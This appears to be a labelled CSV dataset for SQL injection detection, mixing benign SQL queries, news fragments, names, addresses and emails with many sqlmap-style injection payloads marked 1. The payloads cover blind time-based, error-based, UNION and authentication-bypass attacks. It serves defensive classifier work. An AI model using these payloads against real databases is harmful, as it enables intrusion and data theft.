Sentence,Label
iruraiz-gauna,0
" However , Damascus still start destroying existing weapons stockpiles ",0
9813,0
necforo,0
"1 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) -- ctdx",1
r8mio34,0
" &quot; I frustrated angry anyone , &quot; said ",0
"c/ estambul, 117",0
SELECT COUNT ( edge )  FROM property,0
wolfs,0
"1%""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,1
SELECT * FROM use FETCH FIRST 50 PERCENT ROWS ONLY,0
"calle panama, 72 8-b",0
 South Stream meant add diversity Russia &apos;s export routes Europe ,0
1272,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9081 )  ORDER BY meta_id ASC",0
"1 )  where 4710 = 4710 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
SELECT * FROM four WHERE sail = 'influence'  AND  ( later = 'movement' OR safety = 'sleep' ) ,0
87356578w,0
"1%""  )  )   )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"  SELECT creature AS mighty, adult AS [serious]  FROM hair",0
SELECT * FROM wrapped WHERE NOT ability = 'brick'  AND NOT thing = 'doll',0
!,1
moharra jodra,0
"1%"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
61527078p,0
"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 191 )  ORDER BY meta_id ASC",0
SELECT * FROM recently 3,0
montanuy,0
"1"" where 4319  =  4319",1
45840,0
1 where 7442 = 7442,1
"1 )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (  'jloi' = 'jloi",1
broussar,0
SELECT TOP 50 PERCENT * FROM college SELECT * FROM memory FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM rising,0
4617330000000000,0
alyce,0
"1%""  )   union all select null#",1
" end and   (  (   ( ""memh"" like ""memh",1
SELECT * FROM cause WHERE atomic = 'plural',0
pastoral,0
1   )    )    as zykv where 2158  =  2158,1
SELECT equally FROM gate UNION SELECT mouth FROM itself ORDER BY car,0
"1%'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",1
"   SELECT Employees.volume, COUNT ( Orders.adjectiveID )  AS refusedFROM    ( OrdersINNER JOIN breakfast ON Orders.catchID  =  Employees.songID ) ",0
1' rlike sleep  (  5  )  #,1
SELECT * FROM industrial  WHERE drew = rice,0
-t6a1niet7,0
"1"" and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and ""sckh"" = ""sckh",1
"1""  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  ""ffcf"" like ""ffcf",1
"calle dean miranda 106, 6-f",0
SELECT shake,0
 &quot; It &apos;s really important U,0
SELECT color FROM perhaps,0
6837810000000000,0
barro,0
"1 )  as zqxa where 5718 = 5718 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
81878772z,0
"1', ( select  ( case when  ( 2106 = 2106 )  then  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  else 2106* ( select 2106 from master..sysdatabases )  end  )  )  ",1
cadrete,0
SELECT * FROM rhyme ORDER BY heavy DESC,0
"  SELECT most,calm FROM mixture WHERE divide = 'cage' UNION SELECT cloud, fort FROM atom",0
389,0
samuel.felden@multaspendientes.yu,0
SELECT highway ( s )  FROM clear UNION ALL,0
galbarros,0
stewart,0
"1""  )  )   as khqq where 3637 = 3637 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
86651591b,0
"1%""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1%""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
oskar,0
hengevel,0
e3c7i3tu3a,0
"-6770'  )  )   union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",1
"1"" and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ",1
"1  )   union all select null,null,null,null,null,null,null,null,null--",1
"1'  )  )   )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'dsok' = 'dsok",1
nicanora,0
1 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) -- saxs,1
"1%""   )    )    union all select null,null,null--",1
SELECT column_name FROM table_name WHERE column_name operator ALL,0
"1' )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"  SELECT peace AS belt, today AS [leather]  FROM begun",0
"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""iuxs"" like ""iuxs",1
giralda,0
SELECT * FROM accident WHERE likely BETWEEN 'hardly' AND 'command',0
haslund@arvigar.sl,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28074 )  ORDER BY meta_id ASC",0
" SELECT column_name ( s )  FROM mighty,amount",0
SELECT * FROM related WHERE personal = 'search'  AND  ( please = 'she' OR into = 'paper' ) ,0
SELECT COUNT ( fliesID ) FROM grandfather,0
select   (  case when   (  9540  =  5786  )   then 9540 else 9540*  (  select 9540 from information_schema.character_sets  )   end  )  #,1
 Nowadays many possibilities designing house apartment way barrier-free ,0
 Schmidt wish contact colleagues skirmish Hütter ,0
yie-tarn,0
"-2106"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and ""dvlq"" like ""dvlq",1
10940,0
"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"frutos 65, 10?a",0
57970346l,0
11539856c,0
SELECT * FROM safe WHERE increase = 'engine',0
04878,0
innota,0
sandler,0
1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and 'ymnm' = 'ymnm,1
 ( select chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7812 = 7812 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 )  from dual ) ,1
SELECT * FROM frame WHERE pink BETWEEN '1996-07-01' AND '1996-07-31',0
" When became clear much money wasted , decided help Africans controlling budget people ",0
"1, ( cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select 1 from generate_series ( 8979,8979,case when  ( 8979 = 8979 )  then 1 else 0 end )  limit 1 ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric  )  )  ",1
SELECT * FROM  ( SELECT proper FROM becoming ) ,0
gladiolos 30,0
"1'  )   where 6489  =  6489 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
"1 )  where 7978 = 7978 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
"1"" )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
"-9582' )  where 4397 = 4397 union all select 4397,4397,4397#",1
"1'   )    )    as lizu where 7691  =  7691 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
floriano,0
SELECT giving ( s )  FROM this UNION,0
26340,0
2ra71o1,0
masana molera,0
SELECT apart FROM open UNION SELECT ruler FROM forget ORDER BY season,0
31414,0
SELECT * FROM not WHERE change BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM wp_posts WHERE ID  =  28450 LIMIT 1,0
"INSERT INTO tall ( oxygen, coach, term, discussion, lake, fall )  VALUES  ( 'married', 'comfortable'. surprise', 'summer', 'tune', 'suppose', 'skill' )  ",0
"1""   )    )     )   and make_set  (  7809  =  9564,9564  )   and    (    (     (  ""jggk"" like ""jggk",1
1' where 9381 = 9381,1
"  SELECT modern AS forty, belong AS [done]  FROM dozen",0
"1"" )  where 3084 = 3084 union all select null,null--",1
lawlik@housemovie.lk,0
10858,0
"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",1
cavill,0
"1"" )  where 2388 = 2388 union all select null,null,null,null,null,null,null,null,null--",1
"1, ( select  ( case when  ( 3888 = 3888 )  then  ( select count ( * )  from generate_series ( 1,5000000  )  )   else 1/ ( select 0 )  end  )  )  ",1
"1%'  )  )   and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  '%' = '",1
1621765359998786,0
" Familiar voice mind each, highest merit ascribe Moses, Plato, Milton is, set naught books traditions, spoke men thought",0
"1"" and make_set ( 8262 = 3471,3471 )  and ""wayp"" = ""wayp",1
1' rlike sleep ( 5 )  and 'gtfo' = 'gtfo,1
"1%"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
9289,0
"tratado de niza, 96",0
" Over coming days , final decision made Scientific Programme Committee ",0
descostill3r,0
c/ sagrada familia 176,0
1'  )   as znak where 5203  =  5203,1
presson,0
"1  )   as ahfj where 4776  =  4776 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1'+ ( select 'vabj' where 7178 = 7178 union all select null,null,null,null,null#",1
"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1
 The tunnel eighth major passage discovered San Diego since 2006 ,0
 This reported broadcaster SABC ,0
buddy0,0
1'+  (  select 'hplm' where 4008  =  4008 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
6ar10l30,0
mcinerne,0
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1
34361279s,0
SELECT * FROM scene WHERE apple BETWEEN '1996-07-01' AND '1996-07-31',0
08tiro72,0
SELECT * FROM to WHERE dull BETWEEN '1996-07-01' AND '1996-07-31',0
"corredera alta de san pablo, 110,",0
celsa,0
"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",1
SELECT * FROM actually FETCH FIRST 50 PERCENT ROWS ONLY,0
"1""   )    )    as tmpz where 7224  =  7224 and make_set  (  3579  =  1045,1045  )  --",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",1
"-7248"" )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( ""qgms"" = ""qgms",1
SELECT * FROM atomic FETCH FIRST 3 ROWS ONLY,0
DELETE FROM captain WHERE clothing = 'those',0
SELECT * FROM  ( SELECT fuel FROM citizen ) ,0
"-2901"" or elt  (  9866  =  9099,9099  )   and ""asib"" like ""asib",1
12796200n,0
correnta,0
grant connect to name; grant resource to name;,1
minnelli-gorse@canovash.gf,0
2952,0
"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"   SELECT fought, previous, occasionally FROM without WHERE meant  IS NULL",0
"1"" or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1
SELECT * FROM getting WHERE tide NOT LIKE '[shop]%',0
1' and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) ,1
talonera,0
1' and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'ixzr' = 'ixzr,1
1' )  where 5680 = 5680 and  ( 3020 = 3020 ) *6703--,1
"cuesta sal, 171, 5?a",0
 Dr,0
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",1
FROM  ( SELECT DISTINCT any FROM ability ) ,0
"-2898"" where 3301 = 3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",1
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,1
" Salem: Johanna Rahner Ecumenical Discussion Forum At next Ecumenical Discussion Forum Monday 21 October , Neues Museum des Schlosses (New Castle Museum), focus topic &quot; To hell Hell - Theological reflections approach notion end times &quot; ",0
"56 billion , according Thomson Reuters I / B / E / S",0
"c/ elvas 112, 13-a",0
SELECT * FROM money WHERE gate = 'leaving'  AND City = 'goose',0
"1  )  )   as cbdx where 8998 = 8998 and elt ( 4249 = 4249,7259 ) --",1
" However , concern small medium-sized companies remain vulnerable hacking surveillance ",0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'kyos' like 'kyos",1
heintje0@alpesfranceses.com.ro,0
4344811902014577,0
c6he5era,0
menelao,0
1648,0
5447434200049270,0
"-5957  )  )   )  union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",1
"1"" )  where 9020 = 9020 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1
len,0
28194,0
"1""  )  )   as vtad where 3653 = 3653 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
marcos esculta,0
7aria22,0
SELECT TOP 50 PERCENT * FROM discovery SELECT * FROM habit FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM kids,0
"1%""  )  )   or sleep ( 5 ) #",1
" select * from users where id = 1 or ""?@"" or 1 = 1 -- 1",1
castejon quiroga,0
1784780000000000,0
legrandv,0
SELECT * FROM likely WHERE equally = 'is',0
"-7313""  )   where 3606  =  3606 union all select 3606#",1
" &quot; We Mikwe , ritual Jewish bath , &quot; explains ",0
6164299697830366,0
select   (  case when   (  3677  =  2193  )   then 3677 else 1/  (  select 0  )   end  )  --,1
"1' or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and 'ynpr' = 'ynpr",1
SELECT physical FROM mix UNION ALL SELECT safety FROM frog ORDER BY prepare,0
5695,0
"1"" where 1719  =  1719 and 7533  =  7533--",1
pacfica,0
46269,0
1' and 9198  =  9198--,1
"1 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""eaqk""  =  ""eaqk",1
"  SELECT Orders.tellrID, Employees.wide, Employees.ran FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.shineID ORDER BY Orders.shouldID",0
escusaa,0
7542,0
select pg_sleep ( 5 )  and '%' = ',1
"1%""   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
mompi tupayachi,0
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'wjwn'  =  'wjwn",1
1'  )   where 9175  =  9175,1
89687602e,0
SELECT future ( s FROM hunt RIGHT JOIN,0
1'+  (  select 'gtqr' where 5660  =  5660,1
1 where 6304  =  6304,1
"-2382%' )  union all select 8885,8885,8885,8885,8885,8885,8885#",1
SELECT TOP 3 * FROM limited SELECT * FROM wave 3SELECT * FROM cent,0
"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",1
"1""  )  )   union all select null,null,null,null,null,null,null,null#",1
" Teams individual competitors pitted one another disciplines tossing caber , horseshoe tossing bucket carrying ",0
carrer sant joan de deu 186,0
rong,0
"1' where 7464 = 7464 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
"   SELECT complex, tight, slept FROM there WHERE scientist  IS NULL",0
"1  )   as jqbv where 8172  =  8172 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
1'||  (  select 'yzdz' where 5021  =  5021,1
SELECT TOP 3 * FROM themselves WHERE principal = 'art' SELECT * FROM across,0
"-3997'+ ( select 'avjk' where 1917 = 1917 union all select 1917,1917,1917--",1
SELECT TOP 50 PERCENT * FROM body,0
SELECT glad ( s )  FROM curious,0
admin' or '1' = '1,1
1  )  )   as epfz where 5471 = 5471,1
motte@clubdecampo.com.gw,0
"  SELECT LEFT ( ""SQL Tutorial"", 3 )  AS ExtractString;",0
1' )  as ubvf where 5923 = 5923 and 8490 = 4925--,1
abadal braup,0
"1  )  )   as nlzg where 1482 = 1482 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1
nicholls@devuelos.vu,0
-1910' or 2624  =  3371 and 'umoy'  =  'umoy,1
1'  )  )   and 3526 = 1354,1
enlutada,0
1' and 2316  =  7236,1
sant esteve de la sarga,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367535 ) ,0
SELECT TOP 3 * FROM education,0
17467,0
13270,0
"1 where 1153 = 1153 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1
FROM  ( SELECT DISTINCT map FROM run ) ,0
mau@gaudio.an,0
if ( 3490 = 4920 )  select 3490 else drop function hlzt--,1
 Boeing &apos;s performance claims depend part comparing 10-abreast 777X original 9-abreast 777 design ,0
3141140000000000,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""sfnj"" like ""sfnj",1
SELECT TOP 3 * FROM split,0
"1'||  (  select 'jlka' where 5436  =  5436 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"  SELECT magic,perfectly,its FROM discover LEFT JOIN Orders ON down.broadID =  happened.consist ORDER BY occur.save",0
SELECT * FROM worried ORDER BY double DESC,0
des81ra92,0
97729684q,0
"1""  )   as uyns where 4751  =  4751 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",1
select case when 5559 = 3483 then 1 else null end--,1
6208,0
01449036j,0
select  ( case when  ( 2768 = 8868 )  then 2768 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
"-5064  )   as mzxc where 1889  =  1889 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
0680099679266442,0
04869,0
fryar,0
eggebraa,0
-9556 or   (  2049  =  6967  )  *6967# mhbc,1
"-5041'   )    )     )   union all select 4820,4820,4820,4820,4820,4820--",1
 group by userid having 1 = 1--,1
SELECT * FROM look WHERE living = 'given'  AND City = 'face',0
" &quot; While weaker aircraft deliveries mostly anticipated , clearly disappointed margin performance transportation , &quot; Doerksen said client note ",0
charley,0
1 )  and 2457 = 8146,1
violy belcastro,0
SELECT * FROM circle WHERE getting BETWEEN white09/01/1996next AND during15/31/1996came,0
1'+ ( select smze where 5616 = 5616,1
dyment,0
"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
35591968c,0
SELECT compound ( s )  FROM press UNION,0
8323552403219603,0
"1',  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1
1230,0
c/ francisco rodriguez 48,0
 When police stopped discovered takeaway drink legs ,0
"1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and 'tuzl' = 'tuzl",1
"-1434'   )    )    union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",1
c/ javea 57,0
2864,0
salva carol,0
"1' )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and  ( 'sqni' like 'sqni",1
"  SELECT supply AS prepare, layers AS [line]  FROM belt",0
"-3037 )  where 9024 = 9024 union all select 9024,9024--",1
45478096n,0
1'|| ( select 'tznb' from dual where 8808 = 8808 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1
2esco63enti2,0
""" or sleep  (  __TIME__  )  #",1
SELECT * FROM process WHERE eight = 'spell',0
"1%""  )  )   )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1
SELECT * FROM fact WHERE spring LIKE '%tower%',0
"5 million Euro , value last year EUR 2",0
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'kqip' like 'kqip",1
1'+ ( select qugu where 2287 = 2287 order by 1#,1
"   SELECT review, helpful, afternoonFROM enter WHERE poor  IS NOT NULL",0
6ait1na89,0
"-4865 where 1386  =  1386 union all select 1386,1386,1386,1386#",1
1'|| ( select 'scct' where 2587 = 2587 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno  )  )  ||',1
-4904' )  as ogyu where 2821 = 2821 or 5982 = 1643,1
8912004350396189,0
baln,0
" The airline fee Hungary &apos;s Wizz Air , said airline consultant Jay Sorensen , closely tracks add-on fees ",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
119,0
select case when 5346  =  8272 then 1 else null end--,1
2563,0
SELECT * FROM barn WHERE express BETWEEN 'original' AND 'bit',0
"-2722""  )   or 4907  =  8126#",1
1' )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
 The backlog aerospace division $ 32,0
9867,0
genny,0
50227,0
1'  )  )   and  ( 5091 = 8681 ) *8681 and   (  (  'xevm' = 'xevm,1
1 )  where 9860 = 9860 and 4443 = 4111--,1
46842,0
SELECT * FROM  ( SELECT basic FROM ever ) ,0
sira,0
SELECT lack,0
-9690 union all select 7217#,1
SELECT region ( s ) FROM aware INNER JOIN,0
"pl. san marcial 90, 13-e",0
"1'  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'peyy' = 'peyy",1
sabel,0
 Guillaume Nicloux &apos;s adaptation Denis Diderot &apos;s novel boasts exceptional production design period detail also heavier going ,0
"1'|| ( select 'gikt' where 8447 = 8447 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
